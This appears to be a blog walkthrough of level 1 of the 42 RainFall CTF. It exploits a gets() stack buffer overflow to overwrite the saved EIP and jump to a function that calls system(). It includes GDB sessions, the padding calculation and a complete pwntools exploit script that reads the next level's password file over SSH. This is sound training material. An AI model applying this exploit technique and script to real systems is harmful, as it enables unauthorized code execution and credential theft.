---
title: 42 RainFall Level01 - Walkthrough 🚀
tags:
  - cyber-security
  - rainfall
  - assembly
  - ctf
categories:
  - ctfs
  - 42project
date: 2025-01-29 21:33:58
---

# Welcome to RainFall

![rainfall](/images/rainfall.jpg)

# 🌊 **Rainfall: Level 1 - Exploiting Buffer Overflow** 💥

Welcome to the walkthrough of **Level 1** of the Rainfall project! Let's dive into exploiting the buffer overflow vulnerability in the provided binary.

### 🔑 **Login and Setup**

First, log into the **Rainfall machine** using the username `level01` and the flag you obtained from **level0**.

### 🛠️ **Disassembling the Binary**

To disassemble the binary with a **sweat view** 😅, you can use the following command:

```asm
set disassembly-flavor intel
```

This command displays the disassembled code using **Intel syntax** 🖥️, instead of AT&T. 
Personally, I prefer Intel syntax for better readability! 💻

### 🔍 Listing Functions in the Binary

You can list all functions in the binary by using the `info functions` command in GDB:

```asm
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run
0x08048480  main
0x080484a0  __libc_csu_init
0x08048510  __libc_csu_fini
0x08048512  __i686.get_pc_thunk.bx
0x08048520  __do_global_ctors_aux
0x0804854c  _fini
(gdb)
```

#### 📚 Binary and Symbol Resolution
As you can see, there are several functions listed. Also, you can observe that the binary uses the **GOT (Global Offset Table) / PLT (Procedure Linkage Table)** to resolve symbols dynamically. This helps in resolving function addresses during runtime. 🛠️

### 🧐 Disassembling the main Function

Next, let's disassemble the `main` function to inspect the code:

```asm
(gdb) disassemble main
Dump of assembler code for function main:
   0x08048480 <+00>:	push   ebp
   0x08048481 <+01>:	mov    ebp,esp
   0x08048483 <+03>:	and    esp,0xfffffff0
   0x08048486 <+06>:	sub    esp,0x50
   0x08048489 <+09>:	lea    eax,[esp+0x10]
   0x0804848d <+13>:	mov    DWORD PTR [esp],eax
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave
   0x08048496 <+22>:	ret
End of assembler dump.
```

#### 🔧 Analysis of the Assembly Code

As you can see, a buffer is allocated at runtime on the stack. The **0x50** value is **80** in decimal format, meaning a buffer of 80 bytes is allocated.

You can also observe a call to the gets function. As we know, the gets function is **vulnerable** because it does not check the size of the buffer passed as the first argument, which can lead to **buffer overflows**. 💥

#### 🛠️ Understand the Instructions

After the call to the **gets** function, we encounter two instructions: **leave** and **ret**.

- The **leave** instruction can be replaced by **pop ebp**.
- The **ret** instruction can be replaced by **pop eip**.

### 🧪 Sending 256 Bytes to the Binary

Now, let's experiment by sending **256 bytes** to the binary:

```asm
(gdb) run < <(python -c "print('A'*0x100)")
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/user/level1/level1 < <(python -c "print('A'*0x100)")

Breakpoint 1, 0x08048483 in main ()
(gdb) disassemble main
Dump of assembler code for function main:
   0x08048480 <+00>:	push   ebp
   0x08048481 <+01>:	mov    ebp,esp
=> 0x08048483 <+03>:	and    esp,0xfffffff0
   0x08048486 <+06>:	sub    esp,0x50
   0x08048489 <+09>:	lea    eax,[esp+0x10]
   0x0804848d <+13>:	mov    DWORD PTR [esp],eax
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave
   0x08048496 <+22>:	ret
End of assembler dump.
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb)
```

#### ⚠️ Segmentation Fault

As you can see, the program **segfaults** after we send too many bytes (**256** in this case).

- The **SIGSEGV** (Segmentation fault) occurs because we tried to **overflow** the **buffer** with more data than the allocated space can handle. The address **0x41414141** is just a representation of the ASCII character **'A'**, which is what we sent as input.

#### 🔑 Finding Padding to Overwrite the EIP Register

Next, the goal is to find the correct padding to overwrite the **EIP** (Extented Instruction Pointer) register. This is typically a step in a **buffer overflow** exploit, where we need to fill the buffer until we reach the **return address** stored in the **stack**, allowing us to **redirect** the program's flow. 🚀

#### 🧠 Understanding the EIP Register

If you’re not familiar with the **EIP register** (Extended Instruction Pointer), it’s the register used by the CPU to determine which instruction will be executed next at runtime. The **EIP** stores the address of the next instruction to be fetched and executed.

#### 🔍 Finding Padding to Overwrite the EIP

To find the padding required to overwrite the **saved EIP**, you can place a breakpoint at the gets@plt call. Here's how you do it in **gdb**:

```asm
(gdb) disassemble main
Dump of assembler code for function main:
   0x08048480 <+0>:	    push   ebp
   0x08048481 <+1>:	    mov    ebp,esp
=> 0x08048483 <+3>:	    and    esp,0xfffffff0
   0x08048486 <+6>:	    sub    esp,0x50
   0x08048489 <+9>:	    lea    eax,[esp+0x10]
   0x0804848d <+13>:	mov    DWORD PTR [esp],eax
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave
   0x08048496 <+22>:	ret
```

You can see that the function **gets** is called and then the program proceeds to **leave** and **ret**, which are the instructions we can potentially manipulate.

#### 🧭 Inspecting the Stack

Now, let’s examine the stack to find the exact padding:

```asm
(gdb) x/x $eax
0xbffff6f0:	0x080484a0
(gdb) ni
0x08048490 in main ()
(gdb)
0x08048495 in main ()
(gdb) info frame
Stack level 0, frame at 0xbffff740:
 eip = 0x8048495 in main; saved eip 0xb7e454d3
 Arglist at 0xbffff738, args:
 Locals at 0xbffff738, Previous frame's sp is 0xbffff740
 Saved registers:
  ebp at 0xbffff738, eip at 0xbffff73c
```

- **$eax** points to **0x080484a0**, which is the address of the next instruction.
- We can see the **saved EIP** in the frame at address **0xbffff73c**.

#### 🧩 Calculating the Padding

To calculate the padding, we compare the addresses of the saved **EIP** and the address at `$esp + 0x10`:

```asm
(gdb) x/x $esp+0x10
0xbffff6f0:	0x41414141
(gdb) info frame
Stack level 0, frame at 0xbffff740:
 eip = 0x8048495 in main; saved eip 0xb7e454d3
 Arglist at 0xbffff738, args:
 Locals at 0xbffff738, Previous frame's sp is 0xbffff740
 Saved registers:
  ebp at 0xbffff738, eip at 0xbffff73c
(gdb) p/d 0xbffff73c - 0xbffff6f0
$1 = 76
```

From the above, we can see that there are **76 bytes of padding** before we can overwrite the saved **EIP** register.

#### 💥 Exploit Preparation: Overwriting the EIP

First, we send an input that overflows the buffer and overwrites the saved **EIP** register:

```asm
run < <(python -c "print('A'*76+'B'*4)")
```

In this case, `A*76` fills the **buffer**, and `B*4` overwrites the **saved EIP** (which was the return address after the call to gets).

After running this, we disassemble the main function:

```asm
(gdb) disassemble main
Dump of assembler code for function main:
   0x08048480 <+0>:	push   ebp
   0x08048481 <+1>:	mov    ebp,esp
=> 0x08048483 <+3>:	and    esp,0xfffffff0
   0x08048486 <+6>:	sub    esp,0x50
   0x08048489 <+9>:	lea    eax,[esp+0x10]
   0x0804848d <+13>:	mov    DWORD PTR [esp],eax
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave
   0x08048496 <+22>:	ret
End of assembler dump.
```

Here we see that the **gets** function is called. By supplying an input larger than the buffer, we overwrite the **saved EIP** with **0x42424242**, the value corresponding to the **4-byte B sequence**. After this, we proceed with the next instruction using the ni (next instruction) command:

```asm
(gdb) ni
0x08048495 in main ()
(gdb) info frame
Stack level 0, frame at 0xbffff740:
 eip = 0x8048495 in main; saved eip 0x42424242
 Arglist at 0xbffff738, args:
 Locals at 0xbffff738, Previous frame's sp is 0xbffff740
 Saved registers:
  ebp at 0xbffff738, eip at 0xbffff73c
```

As we can see, the **saved EIP** is now **0x42424242**, which means the program will now jump to this address when it executes the **ret** instruction. This is because the **EIP** holds the address of the next instruction to execute, and by modifying it, we can control the flow of the program.

#### 🧳 Running the Function: System Exploit

To trigger the exploit, we need to control the program's execution flow to call the `system()` function, which can execute a shell command.

The `run` function is responsible for invoking `system()`:

```asm
0x08048444 <+0>:	push   ebp
0x08048445 <+1>:	mov    ebp,esp
0x08048447 <+3>:	sub    esp,0x18
0x0804844a <+6>:	mov    eax,ds:0x80497c0
0x0804844f <+11>:	mov    edx,eax
0x08048451 <+13>:	mov    eax,0x8048570
0x08048456 <+18>:	mov    DWORD PTR [esp+0xc],edx
0x0804845a <+22>:	mov    DWORD PTR [esp+0x8],0x13
0x08048462 <+30>:	mov    DWORD PTR [esp+0x4],0x1
0x0804846a <+38>:	mov    DWORD PTR [esp],eax
0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
0x08048472 <+46>:	mov    DWORD PTR [esp],0x8048584
0x08048479 <+53>:	call   0x8048360 <system@plt>
0x0804847e <+58>:	leave
0x0804847f <+59>:	ret
```

The `system@plt` function is a wrapper for the `execve()` system call, which is used to execute shell commands.

#### 🎯 The Exploit: Redirecting Execution

To exploit this vulnerability, you need to overwrite the **EIP** with the address of the run function. The CPU reads memory in **little-endian** format, so you need to place the address in little-endian order (reversed byte order).

Once the **EIP** is set to the address of run, it will execute the function, which calls **system()**, and from there, you can control what command is executed.

```python
#!/usr/bin/env python3

import sys

try:
    from pwn import *
except ImportError as err:
    print("ImportError: %s" % (err))
    sys.exit(1)

context.update(arch='i386', os='linux')
s=ssh(host='10.12.249.47',user='level1',password='XXXXX',port=4242)

p = s.process("./level1")

run = p.elf.symbols['run']

payload = b'\x42' * 76
payload += p32(run) # run()

p.sendline(payload)

p.recvuntil(b'Good... Wait what?')
p.sendline(b"cd ../level2")
p.sendline(b"cat .pass")

flag = p.recvline()
print(flag)

p.interactive()
p.close()
```

#### 🔑 Key Concepts to Remember

- **GOT/PLT**: The Global Offset Table (GOT) and Procedure Linkage Table (PLT) are used for dynamic linking. The binary uses them to resolve function addresses at runtime, allowing for greater flexibility.
- **EIP**: The Instruction Pointer register determines which instruction the CPU will execute next. Overwriting it allows you to control the program's flow.

#### Good luck on your journey to mastering buffer overflow exploits! 🌟
